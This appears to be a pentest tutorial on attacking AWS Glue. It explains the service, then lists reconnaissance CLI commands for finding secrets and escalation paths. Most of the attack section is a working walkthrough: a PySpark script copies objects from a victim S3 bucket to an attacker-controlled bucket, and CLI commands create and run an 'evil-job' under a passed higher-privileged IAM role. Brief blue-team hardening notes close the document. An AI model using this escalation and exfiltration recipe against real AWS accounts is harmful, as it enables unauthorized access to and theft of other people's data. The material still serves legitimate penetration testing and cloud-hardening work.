# Core

**AWS Glue** is a fully managed service for **ETL (Extract, Transform, Load)**:

- **Extract** â€” pulls data from multiple sources (S3, RDS, Redshift, JDBC, etc.).
- **Transform** â€” processes and cleans data (e.g., via PySpark scripts).
- **Load** â€” loads data into storage (such as S3 or Redshift) for analytics or Machine Learning.

**Common use cases:**

- Preparing data for analytics (Athena, ML, Redshift).
- Integrating multiple data sources.
- Data cataloging (via **Glue Data Catalog** â€” table and database metadata).

---

# ğŸ›¡ Glue in an AWS Pentest Context

## ğŸ“ What may be interesting from an attackerâ€™s perspective:

1. **Access to sensitive data**
   - Glue often interacts with S3 buckets, RDS, and Redshift.
   - Scripts and pipelines may contain **secrets, keys, or credentials**, including hardcoded values.
   - For example, a Glue Job script may include `aws_access_key_id` and `aws_secret_access_key`.

2. **Privilege escalation via IAM roles**
   - Glue jobs typically run under an **IAM role**.
   - If you can **edit or run a Glue Job**, you can leverage the role attached to it.
   - If that role has broader permissions â€” ğŸ’¥ privilege escalation.

3. **Access misconfiguration**
   - Having `glue:*` is effectively admin-level access.
   - A common issue is having `glue:CreateJob` + `iam:PassRole`; even with a restricted role, this allows running arbitrary code under a higher-privileged role.

4. **Code execution**
   - Glue jobs can be created with custom Python (PySpark) scripts.
   - If you can run your own code â†’ you can exfiltrate data, perform backups, scan the network, upload shells to S3, etc.

---

## ğŸ” What to Look for During a Pentest:

| Target | What to Check | Why It Matters |
| --- | --- | --- |
| **Glue Jobs** | `aws glue get-jobs`, `aws glue get-job --name your-job` | Retrieve scripts, discover secrets |
| **Data Catalog** | `aws glue get-databases`, `aws glue get-tables` | Visibility into existing databases and tables |
| **Permissions** | `iam list-policies`, `glue:CreateJob`, `glue:StartJobRun`, `iam:PassRole` | Privilege escalation and code execution paths |
| **Connections** | `aws glue get-connections` | JDBC endpoints; may reveal DB credentials |

---

# Example Attack via a Glue Job

## ğŸ“Œ Preconditions:

You have **already compromised an IAM user** with the following permissions:

- `glue:CreateJob`
- `glue:StartJobRun`
- `iam:PassRole` (on a Glue service role with access to a target S3 bucket)

---

### ğŸ§ª Step 1: Write a PySpark Script

Example script that reads data from S3 and sends it to you (or writes it to another bucket):

```python
import boto3

def upload_data():
    s3 = boto3.client('s3')
    bucket = 'target-victim-bucket'
    key = 'secret-data.txt'

    # Read file (or list of files)
    obj = s3.get_object(Bucket=bucket, Key=key)
    data = obj['Body'].read().decode('utf-8')

    # Exfiltrate data â€” e.g., to your own bucket
    s3.put_object(Bucket='attacker-bucket', Key='loot.txt', Body=data)

upload_data()
```

> ğŸ” You could also download the entire bucket if you use `list_objects_v2`.
> 

---

### ğŸ›  Step 2: Create the Glue Job

```bash
aws glue create-job \
  --name evil-job \
  --role arn:aws:iam::victim:role/GlueServiceRoleWithS3Access \
  --command '{"Name":"glueetl","ScriptLocation":"s3://attacker-bucket/evil_script.py","PythonVersion":"3"}' \
  --region your-region
```

> ğŸ‘‰ Make sure to upload `evil_script.py` to your S3 bucket beforehand.

---

### ğŸš€ Step 3: Start the Job

```bash
aws glue start-job-run --job-name evil-job
```

If successful, the script executes under the role passed via --role, not your compromised user.
This results in Privilege Escalation + Data Exfiltration.

---

## ğŸ” Defensive Notes (Blue Team):

- Never grant unrestricted iam:PassRole
- Always restrict which roles Glue can assume
- Monitor Glue Job scripts and executions (CloudTrail)
- Isolate sensitive S3 buckets via bucket policies
